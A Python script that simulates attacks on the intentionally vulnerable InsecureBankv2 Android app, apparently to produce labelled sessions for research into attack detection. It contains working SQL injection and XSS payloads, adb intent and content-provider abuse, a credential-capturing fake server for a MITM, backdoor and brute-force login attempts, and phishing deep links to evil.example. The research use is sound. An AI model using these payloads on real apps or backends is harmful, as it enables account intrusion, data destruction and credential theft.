"""Attack simulations for InsecureBankv2, reusing the benign collector's functions.

Two ways to start every attack (collect_attacks_qais.py picks one per session):

  * "genuine" - first walk the normal journey (user_actions.login, same as
    journey.py's login_session_flow), then attack from inside the app through
    the existing user_actions.* helpers.  Events look like a real user session
    that turns malicious mid-flow.
  * "direct"  - no UI journey at all: fire adb intents / content-provider
    queries / broadcasts / API calls straight at the exported surface, the
    same way another app on the device would.

Each function signature mirrors journey.run_activity: (ctx, rng) -> dict with
at least {"attack": <name>}.  ctx carries everything an attack needs:

    ctx = {
        "driver":  Appium driver or None        (direct mode may still pass one),
        "user":    "dinesh", "pw": "Dinesh@123$",
        "logged_in": True/False,                (genuine mode only)
        "mode":    "genuine" | "direct",
    }

Attack classes (attack_class values, written to labels.csv):

    injection               SQL / input injection (VULN-002, VULN-004)
    unauthorized_component  exported components, provider, broadcast (VULN-003)
    network                 cleartext HTTP, MITM capture, API tampering
    deep_link               malicious ACTION_VIEW links (ME-12)
    compromised_runtime     root / emulator only (ME-14/15) - tamper (ME-13)
    insecure_storage        extra: logs, prefs, backup, clipboard, WebView
    weak_auth               extra: dev backdoor, brute force, broken authz

Everything here only ever touches the local research fixture (emulator +
AndroLabServer), exactly like the benign collector.
"""

import json
import subprocess
import threading
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

from config import PKG, start_driver
from human_pauses import think
from user_actions import (
    login, open_tile, pay_bill, deposit, sync_and_search_transaction_history,
    view_account_detalis, view_statement, update_profile, set_ip_and_port,
)
import screens as S

USER, PW = "dinesh", "Dinesh@123$"
BACKEND = "http://127.0.0.1:8888"          # host side; 10.0.2.2 from the emulator
PROVIDER_URI = "content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers"

# --------------------------------------------------------------------------
# adb helpers (the "direct" engine; also used by genuine attacks to reach
# the exported surface a normal tap cannot)
# --------------------------------------------------------------------------

def adb(*args, check=False):
    r = subprocess.run(["adb", "shell", *args], capture_output=True, text=True)
    if check and r.returncode != 0:
        raise RuntimeError(f"adb {' '.join(args)} failed: {r.stdout} {r.stderr}")
    return r


def adb_start(component, extras=(), action=None, data=None):
    """am start -n PKG/<component> [--es k v ...] [-a ACTION] [-d URI]"""
    cmd = ["am", "start", "-n", f"{PKG}/{component}"]
    if action:
        cmd += ["-a", action]
    if data:
        cmd += ["-d", data]
    for k, v in extras:
        cmd += ["--es", k, str(v)]
    return adb(*cmd)


def adb_broadcast(action, extras=()):
    cmd = ["am", "broadcast", "-a", action]
    for k, v in extras:
        cmd += ["--es", k, str(v)]
    return adb(*cmd)


def api_post(path, fields):
    """Direct backend call, bypassing the app - the network-attacker view."""
    body = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(BACKEND + path, data=body)
    with urllib.request.urlopen(req, timeout=10) as r:
        return json.load(r)


def genuine_login(ctx):
    """The genuine journey's first step, identical to journey.login_session_flow."""
    if not ctx.get("logged_in"):
        login(ctx["driver"], ctx["user"], ctx["pw"])
        think(3)
        ctx["logged_in"] = True


def settle(sec=2):
    think(sec)


# ==========================================================================
# 1. Injection attacks  (attack_class = "injection")  - VULN-002 / VULN-004
# ==========================================================================

SQLI_PAYLOADS = [
    "'  OR  '1'='1",                                   # tautology: returns everything
    "'  OR  1=0 --",                                  # always false: returns nothing
    "x') UNION SELECT reference,account_number,type,direction,"
    "amount,counterparty,txn_date FROM transaction_cache --",  # UNION arm (7 cols)
    "' OR '1'='1' --",
    "'; DROP TABLE transaction_cache; --",            # destructive attempt (caught, harmless)
    "' OR 1=1 --",                                    # comment truncation, no UNION
    "' AND 1=1--",                                    # comment truncation, true branch
    "' AND 1=2--",                                    # comment truncation, false branch
    "' OR (SELECT substr(counterparty,1,1) FROM transaction_cache LIMIT 1)='x",  # boolean blind
    "%",                                              # LIKE wildcard: matches all rows
    "_%_%_%",                                         # LIKE wildcard pattern / heavy scan
]


def injection_sqli_search(ctx, rng, payload=None):
    """VULN-002: keyword is concatenated into the local SQLite statement."""
    genuine_login(ctx)  # precondition: Transaction History needs a session
    payload = payload or rng.choice(SQLI_PAYLOADS)
    # genuine path: the exact helper the benign journey uses, with a hostile keyword
    sync_and_search_transaction_history(ctx["driver"], payload)
    return {"attack": "sqli_transaction_search", "payload": payload}


def injection_sqli_search_direct(ctx, rng):
    """Same vuln, preset_keyword extra - the entry point the app itself documents."""
    genuine_login(ctx)  # TransactionHistoryActivity.requireSession() needs it
    payload = rng.choice(SQLI_PAYLOADS)
    adb_start(".TransactionHistoryActivity",
              extras=[("uname", ctx["user"]), ("preset_keyword", payload)])
    settle()
    # press Search on the pre-filled box so the query actually runs
    try:
        from config import tap
        tap(ctx["driver"], S.TRANSACTION["search_btn"], timeout=5)
    except Exception:
        pass
    return {"attack": "sqli_transaction_search_direct", "payload": payload}


def injection_bill_number(ctx, rng):
    """VULN-004: bill number / amount are forwarded with no validation at all."""
    genuine_login(ctx)
    payload = rng.choice(["'  OR  1=1--", "x'; DROP TABLE billpayments; --", "A" * 400, ""])
    pay_bill(ctx["driver"], "Water", "123456789", payload, str(rng.randrange(-500, 500)))
    return {"attack": "injection_bill_payment", "payload": payload[:40]}


def injection_provider_selection(ctx, rng):
    """SQL injection through the exported provider's selection argument."""
    where = "' OR '1'='1"
    r = adb("content", "query", "--uri", PROVIDER_URI, "--where", f"name='{where}")
    return {"attack": "sqli_provider_selection", "payload": where,
            "output": (r.stdout or "")[:200]}


def injection_provider_sortorder(ctx, rng):
    """ORDER BY injection via the provider's sortOrder argument (attempt).

    sortOrder reaches SQLiteQueryBuilder.query() unparameterised, so a
    CASE WHEN subquery in the sort position can leak data boolean-blind.
    The `content` CLI may not expose --sort on every API level; the attempt
    (and its rc/output) is still recorded either way.
    """
    sort = "name, (CASE WHEN (substr((SELECT name FROM names LIMIT 1),1,1)='a') THEN name ELSE id END)"
    r = adb("content", "query", "--uri", PROVIDER_URI, "--sort", sort)
    return {"attack": "sqli_provider_sortorder", "payload": sort[:60],
            "rc": r.returncode, "output": (r.stdout or r.stderr or "")[:200]}


def injection_provider_projection(ctx, rng):
    """Projection injection via the provider's column list (attempt)."""
    proj = "name, (SELECT name FROM names LIMIT 1) AS leaked"
    r = adb("content", "query", "--uri", PROVIDER_URI, "--projection", proj)
    return {"attack": "sqli_provider_projection", "payload": proj[:60],
            "rc": r.returncode, "output": (r.stdout or r.stderr or "")[:200]}


def injection_blind_search(ctx, rng):
    """Boolean-blind SQLi through the genuine search box: the row count in
    the UI leaks one character at a time (true branch vs false branch)."""
    genuine_login(ctx)
    payload = rng.choice([
        "' OR (SELECT substr(counterparty,1,1) FROM transaction_cache LIMIT 1)='x",
        "' AND (SELECT COUNT(*) FROM transaction_cache)>0 --",
        "' OR 1=1 --",
    ])
    sync_and_search_transaction_history(ctx["driver"], payload)
    return {"attack": "sqli_boolean_blind_search", "payload": payload[:60]}


def injection_wildcard_search(ctx, rng):
    """LIKE wildcard pattern injection: % / _ make the filter match everything."""
    genuine_login(ctx)
    payload = rng.choice(["%", "_%_%", "%%%%%%%%", "%a%"])
    sync_and_search_transaction_history(ctx["driver"], payload)
    return {"attack": "sqli_like_wildcard_search", "payload": payload}


INJECTION = [injection_sqli_search, injection_sqli_search_direct,
              injection_bill_number, injection_provider_selection,
              injection_provider_sortorder, injection_provider_projection,
              injection_blind_search, injection_wildcard_search]

# ==========================================================================
# 2. Unauthorized Android Component Access  ("unauthorized_component")
#    VULN-003 + every other exported component in the manifest
# ==========================================================================

def unauthorized_beneficiary_autofill(ctx, rng):
    """VULN-003: exported BeneficiaryActivity adds a payee from intent extras alone.

    Works in direct mode (session persists from an earlier genuine login,
    which is exactly the real-world precondition) and in genuine mode.
    """
    name = f"External Payee {rng.randrange(10**6)}"
    r = adb_start(".BeneficiaryActivity", extras=[
        ("uname", ctx["user"]),
        ("autofill_bene_name", name),
        ("autofill_bene_account", "111122223333"),
        ("autofill_bene_bank", "Attacker Bank"),
    ])
    settle()
    return {"attack": "exported_beneficiary_autofill", "payee": name,
            "output": (r.stdout or "")[:200]}


def unauthorized_exported_screens(ctx, rng):
    """PostLogin / DoTransfer / ViewStatement / ChangePassword are all exported.

    Starting them directly with a spoofed `uname` extra reaches screens that
    should only ever be reachable after the in-app login flow.
    """
    hits = []
    components = [".PostLogin", ".DoTransfer", ".ViewStatement", ".ChangePassword"]
    rng.shuffle(components)  # randomised order, not manifest order
    for comp in components:
        r = adb_start(comp, extras=[("uname", ctx["user"])])
        hits.append(f"{comp}:{r.returncode}")
        settle(1)
    return {"attack": "exported_screens_spoofed_uname", "components": ",".join(hits)}


def unauthorized_provider_crud(ctx, rng):
    """Exported TrackUserContentProvider: read / write / delete with no authz."""
    name = f"attack{ rng.randrange(10**6)}"
    ins = adb("content", "insert", "--uri", PROVIDER_URI, "--bind", f"name:s:{name}")
    q = adb("content", "query", "--uri", PROVIDER_URI)
    dele = adb("content", "delete", "--uri", PROVIDER_URI, "--where", f"name='{name}'")
    return {"attack": "provider_unauthorized_crud", "inserted": name,
            "insert_rc": ins.returncode, "delete_rc": dele.returncode,
            "query_rows": len((q.stdout or "").splitlines())}


def unauthorized_broadcast_sms(ctx, rng):
    """Exported MyBroadCastReceiver trusts anyone's `theBroadcast` intent."""
    r = adb_broadcast("theBroadcast", extras=[
        ("phonenumber", "5550001111"), ("newpass", "pwned-by-broadcast")])
    return {"attack": "broadcast_receiver_sms_injection",
            "output": (r.stdout or "")[:200]}


UNAUTHORIZED_COMPONENT = [unauthorized_beneficiary_autofill,
                          unauthorized_exported_screens,
                          unauthorized_provider_crud,
                          unauthorized_broadcast_sms]

# ==========================================================================
# 3. Network Communication Attacks  ("network")
#    The app speaks cleartext HTTP to a configurable IP:port - a MITM only
#    needs the user to be pointed at the attacker's server.
# ==========================================================================

class _CaptureHandler(BaseHTTPRequestHandler):
    """Attacker server: records every POST credential, answers 'success'."""
    captured = []

    def do_POST(self):
        body = self.rfile.read(int(self.headers.get("Content-Length", 0)))
        _CaptureHandler.captured.append(
            {"path": self.path, "body": body.decode(errors="replace")})
        reply = {"message": "Correct Credentials", "user": "dinesh",
                 "from": 123456789, "to": 888888888, "balance": 999999}
        data = json.dumps(reply).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def log_message(self, *a):
        pass


def network_mitm_credential_capture(ctx, rng):
    """Point the app at a fake server, log in, harvest the cleartext password."""
    server = HTTPServer(("0.0.0.0", 9999), _CaptureHandler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    try:
        set_ip_and_port(ctx["driver"], ip="10.0.2.2", port="9999")
        login(ctx["driver"], ctx["user"], ctx["pw"])
        settle(3)
    finally:
        server.shutdown()
        server.server_close()
        set_ip_and_port(ctx["driver"], ip="10.0.2.2", port="8888")  # restore
    leaked = [c for c in _CaptureHandler.captured if "password" in c["body"]]
    return {"attack": "mitm_cleartext_credential_capture",
            "captured_posts": len(_CaptureHandler.captured),
            "credential_posts": len(leaked)}


def network_api_tampering(ctx, rng):
    """Replay / tamper backend requests directly (no app needed at all)."""
    results = {}
    # negative bill payment (VULN-004 server side)
    results["paybill_negative"] = api_post("/paybill", {
        "username": ctx["user"], "password": ctx["pw"], "category": "Water",
        "bill_number": "' OR 1=1--", "amount": "-1000", "payer_account": "123456789"})
    # deposit into someone else's account (VULN-006 server side)
    results["deposit_foreign_account"] = api_post("/deposit", {
        "username": ctx["user"], "password": ctx["pw"],
        "account_number": "555555555", "amount": "5000"})
    # forged login response is what the MITM above relies on; here just probe
    results["getaccounts_wrong_pw"] = api_post("/getaccounts", {
        "username": ctx["user"], "password": "wrong"})
    return {"attack": "network_api_tampering",
            "messages": {k: v.get("message", "") for k, v in results.items()}}


NETWORK = [network_mitm_credential_capture, network_api_tampering]

# ==========================================================================
# 4. Malicious Deep Links  ("deep_link")  - ME-12 DEEP_LINK_INVOCATION
#    No scheme is declared, but RaspApp fires ME-12 for ANY ACTION_VIEW
#    intent carrying a data URI - and the screens trust the extras it carries.
# ==========================================================================

DEEP_LINK_TEMPLATES = [
    "insecurebankv2://beneficiary?uname={u}&autofill_bene_name=DeepLink%20Payee&autofill_bene_account=999000111",
    "https://evil.example/phish?uname={u}&preset_keyword=%27%20OR%20%271%27%3D%271",
    "insecurebankv2://postlogin?uname={u}",
    "insecurebankv2://statement?uname={u}",
    "intent://beneficiary#Intent;scheme=insecurebankv2;end",
]


def deep_link_malicious(ctx, rng):
    uri = rng.choice(DEEP_LINK_TEMPLATES).format(u=ctx["user"])
    component = rng.choice([".BeneficiaryActivity", ".PostLogin", ".ViewStatement",
                            ".TransactionHistoryActivity"])
    r = adb_start(component, action="android.intent.action.VIEW", data=uri,
                  extras=[("uname", ctx["user"])])
    settle()
    return {"attack": "malicious_deep_link", "uri": uri[:80], "component": component,
            "output": (r.stdout or "")[:200]}


def deep_link_phishing(ctx, rng):
    """Link that lands on the login screen's own flow with attacker pre-fill."""
    uri = f"https://secure-bank-login.example/reset?user={ctx['user']}&next=postlogin"
    r = adb_start(".LoginActivity", action="android.intent.action.VIEW", data=uri)
    settle()
    return {"attack": "deep_link_phishing_login", "uri": uri[:80],
            "output": (r.stdout or "")[:200]}


DEEP_LINK = [deep_link_malicious, deep_link_phishing]

# ==========================================================================
# 5. Compromised Runtime Environment  ("compromised_runtime")  ME-14/15 only.
#    Tampering (ME-13) and debugger (ME-11) are EXCLUDED on purpose: they
#    are rule-based checks handled by RaspApp, not behavioural attacks.
# ==========================================================================

def compromised_emulator_root(ctx, rng):
    """The app already runs on an emulator (ME-15 DETECTED); now also try to
    plant a root indicator and re-launch so ME-14 fires again."""
    adb("shell", "mkdir", "-p", "/sdcard/xbin")            # attempt, may be denied
    adb("shell", "touch", "/data/local/xbin/su")           # attempt, usually denied
    driver = ctx.get("driver")
    if driver is not None:
        driver.terminate_app(PKG)
        driver.activate_app(PKG)
    settle()
    return {"attack": "emulator_plus_root_probe",
            "note": "ME-15 fires on every launch; su placement is best-effort"}


COMPROMISED_RUNTIME = [compromised_emulator_root]

# ==========================================================================
# 6. EXTRA: Insecure Storage, Logging & WebView  ("insecure_storage")
#    VULN-001 (sensitive data to logcat), VULN-005 (profile mirrored to
#    world-readable prefs + external file), ME-01/03/04/05/08.
# ==========================================================================

def insecure_storage_logcat_and_backup(ctx, rng):
    """Browse Account Details (logs credentials - VULN-001), then try to pull
    the app's data out with adb backup / run-as, and read its statement file."""
    genuine_login(ctx)
    view_account_detalis(ctx["driver"])
    update_profile(ctx["driver"], f"probe{rng.randrange(10**4)}@example.invalid")
    view_statement(ctx["driver"])
    logcat = adb("logcat", "-d", "-s", "InsecureBankv2:D", "AndroidRuntime:E")
    backup = adb("shell", "bmgr", "backupnow", PKG)
    runas = adb("shell", "run-as", PKG, "ls", "shared_prefs")
    ext = adb("shell", "ls", "/sdcard")
    return {"attack": "sensitive_logging_storage_exposure",
            "logcat_lines": len((logcat.stdout or "").splitlines()),
            "backup_rc": backup.returncode, "run_as_rc": runas.returncode,
            "external_storage_files": (ext.stdout or "")[:200]}


def insecure_storage_clipboard_webview(ctx, rng):
    """Clipboard is watched (ME-04) and ViewStatement loads file:// URLs with
    JavaScript enabled (ME-08) - copy text, then open the statement screen."""
    genuine_login(ctx)
    adb("shell", "cmd", "clipboard", "set", "-t", "text/plain", "attacker-copied-text")
    view_statement(ctx["driver"])
    return {"attack": "clipboard_and_webview_file_access"}


INSECURE_STORAGE = [insecure_storage_logcat_and_backup,
                    insecure_storage_clipboard_webview]

# ==========================================================================
# 7b. WebView XSS  ("webview_xss")  ME-08 + ME-03
#    ViewStatement loads Statements_<user>.html from external storage with
#    JavaScript ON, and DoTransfer writes user text into that file unescaped.
# ==========================================================================

def _push_statement(driver, html):
    """Write a statement file to external storage exactly where the app reads it."""
    path = "/sdcard/Statements_dinesh.html"
    cmd = ["adb", "shell", "sh", "-c", f"cat > {path}"]
    subprocess.run(cmd, input=html, capture_output=True, text=True)
    return path


def webview_xss_stored(ctx, rng):
    """Stored XSS: script typed into a transfer lands in the HTML statement file
    (written unescaped by DoTransfer) and runs when the statement is viewed."""
    genuine_login(ctx)
    from user_actions import add_beneficiary, transfer_to_beneficiary
    payee = f"XSS Payee {rng.randrange(10**4)}"
    add_beneficiary(ctx["driver"], payee, "555555555", "Bank Muscat")
    transfer_to_beneficiary(ctx["driver"],
                            "<script>alert(1)</script>", "123456789", payee)
    view_statement(ctx["driver"])
    return {"attack": "webview_stored_xss_via_transfer", "payee": payee}


def webview_xss_external_file(ctx, rng):
    """External-storage injection: any app can drop a script into the statement
    file the app loads with JavaScript enabled."""
    genuine_login(ctx)
    _push_statement(ctx["driver"],
                    "<html><body><script>alert(document.domain)</script>"
                    "Injected statement</body></html>")
    view_statement(ctx["driver"])
    return {"attack": "webview_xss_external_storage_file"}


def webview_xss_link_hijack(ctx, rng):
    """Link hijack: a link inside the statement file navigates the app's
    WebView to an attacker page (MyWebViewClient loads any URL)."""
    genuine_login(ctx)
    _push_statement(ctx["driver"],
                    '<html><body><a href="https://evil.example/phish">Click here</a>'
                    '</body></html>')
    view_statement(ctx["driver"])
    try:
        from config import tap, by_text
        tap(ctx["driver"], by_text("Click here"), timeout=5)
    except Exception:
        pass
    return {"attack": "webview_link_hijack"}


WEBVIEW_XSS = [webview_xss_stored, webview_xss_external_file, webview_xss_link_hijack]

# ==========================================================================
# 7. EXTRA: Weak Authentication & Broken Authorization  ("weak_auth")
#    /devlogin backdoor, credential brute force, VULN-006 foreign deposit.
# ==========================================================================

def weak_auth_devlogin_backdoor(ctx, rng):
    """The backend answers /devlogin for ANY username with no password - a
    full authentication bypass, no app interaction needed."""
    r = api_post("/devlogin", {"username": "victim-anyone"})
    return {"attack": "devlogin_backdoor", "message": r.get("message", "")}


def weak_auth_brute_force(ctx, rng):
    """Repeated failed logins through the genuine UI (ME-06 EXTERNAL_INPUT)."""
    wrong = ["wrong1", "123456", "password", "dinesh", "letmein"]
    rng.shuffle(wrong)  # randomised guess order
    for pw in wrong:
        try:
            login(ctx["driver"], ctx["user"], pw)
            think(1)
        except Exception:
            pass
    login(ctx["driver"], ctx["user"], ctx["pw"])   # recover the session
    return {"attack": "brute_force_login", "attempts": len(wrong)}


def weak_auth_foreign_deposit(ctx, rng):
    """VULN-006 through the genuine UI: credit jack's account as dinesh."""
    genuine_login(ctx)
    deposit(ctx["driver"], "555555555", "5000")
    return {"attack": "foreign_account_deposit_ui"}


WEAK_AUTH = [weak_auth_devlogin_backdoor, weak_auth_brute_force,
             weak_auth_foreign_deposit]

# --------------------------------------------------------------------------
# Registry: attack_class -> [attack functions], in labels.csv order
# --------------------------------------------------------------------------

ATTACKS = {
    "injection": INJECTION,
    "unauthorized_component": UNAUTHORIZED_COMPONENT,
    "network": NETWORK,
    "deep_link": DEEP_LINK,
    "compromised_runtime": COMPROMISED_RUNTIME,
    "insecure_storage": INSECURE_STORAGE,
    "webview_xss": WEBVIEW_XSS,
    "weak_auth": WEAK_AUTH,
}


BENIGN_PREFIX_ACTIONS = [
    ("account_details", lambda d: view_account_detalis(d)),
    ("statement", lambda d: view_statement(d)),
    ("history_search", lambda d: sync_and_search_transaction_history(d, "Transfer")),
    ("profile", lambda d: update_profile(d, "prefix.user@example.invalid")),
]


def random_benign_prefix(ctx, rng):
    """Randomised start point: 0-3 genuine tiles, randomly chosen + ordered,
    before the attack fires - so no two sessions share the same pre-attack shape."""
    n = rng.randint(0, 3)
    chosen = rng.sample(BENIGN_PREFIX_ACTIONS, n)   # random subset, random order
    done = []
    for name, fn in chosen:
        try:
            fn(ctx["driver"])
            done.append(name)
        except Exception:
            pass  # a failed tile must never block the attack itself
    think(rng.uniform(0.5, 4.0))  # randomised "reading the screen" pause
    return done


def run_attack(attack_class, func, seed, mode):
    """One session: genuine = log in first (journey-style), direct = adb/API only."""
    import random
    rng = random.Random(seed)
    ctx = {"user": USER, "pw": PW, "mode": mode, "logged_in": False, "driver": None}
    driver = None
    try:
        if mode == "genuine":
            driver = start_driver()
            ctx["driver"] = driver
            genuine_login(ctx)
            ctx["prefix"] = random_benign_prefix(ctx, rng)  # randomised start point
        elif mode == "direct":
            # app session persists (no_reset) - start a driver only so the app
            # process is alive WITHOUT walking the login journey
            try:
                driver = start_driver()
                ctx["driver"] = driver
            except Exception:
                ctx["driver"] = None
        result = func(ctx, rng)
        result.setdefault("attack_class", attack_class)
        result.setdefault("prefix", ctx.get("prefix", []))
        result.setdefault("mode", mode)
        result.setdefault("seed", seed)
        return result
    finally:
        if driver is not None:
            try:
                driver.quit()
            except Exception:
                pass


if __name__ == "__main__":
    import sys
    print("attack classes:", ", ".join(ATTACKS))
    print("usage: python attacks_qais.py <attack_class> [genuine|direct] [seed]")
    if len(sys.argv) > 1:
        cls = sys.argv[1]
        mode = sys.argv[2] if len(sys.argv) > 2 else "direct"
        seed = int(sys.argv[3]) if len(sys.argv) > 3 else 0
        func = ATTACKS[cls][0]
        print(json.dumps(run_attack(cls, func, seed, mode), indent=2))
